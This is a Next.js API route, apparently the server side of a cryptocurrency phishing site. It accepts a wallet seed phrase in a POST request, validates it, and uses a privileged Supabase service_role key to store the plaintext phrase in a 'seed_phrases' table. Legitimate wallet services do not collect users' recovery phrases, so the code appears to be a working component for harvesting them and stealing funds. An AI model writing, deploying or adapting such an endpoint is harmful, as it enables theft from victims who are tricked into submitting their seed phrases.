
import { createClient } from "@supabase/supabase-js";
import { NextResponse } from "next/server";
import { z } from "zod";

const seedPhraseSchema = z.object({
  seedPhrase: z.string().min(12, "Seed phrase must be at least 12 words."),
  network: z.string().min(1, "Network is required."),
});

// IMPORTANT: This route uses the service_role key to bypass RLS for inserts.
// Your service_role key should be kept secret and only used on the server.
// It should be stored in an environment variable, for example, in a .env.local file.
// Make sure SUPABASE_SERVICE_ROLE_KEY is set in your environment.

export async function POST(request: Request) {
  try {
    const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
    const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

    if (!supabaseUrl || !supabaseServiceRoleKey) {
      console.error("Server-side Supabase environment variables are missing.");
      return NextResponse.json({ error: "Server configuration error." }, { status: 500 });
    }

    // Create a new Supabase client with the service_role key for this server-side operation
    const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey);
    
    const body = await request.json();
    const parsed = seedPhraseSchema.safeParse(body);

    if (!parsed.success) {
      return NextResponse.json(
        { error: "Invalid data: " + parsed.error.errors.map(e => e.message).join(", ") },
        { status: 400 }
      );
    }

    const { seedPhrase, network } = parsed.data;

    const { data, error } = await supabaseAdmin
      .from("seed_phrases")
      .insert([{ seed_phrase: seedPhrase, network }])
      .select();

    if (error) {
      console.error("Supabase admin insert error:", error);
      return NextResponse.json({ error: "Failed to register seed phrase." }, { status: 500 });
    }

    return NextResponse.json({ success: true, data });
  } catch (err) {
    console.error("Unexpected error in API route:", err);
    return NextResponse.json({ error: "An unexpected server error occurred." }, { status: 500 });
  }
}
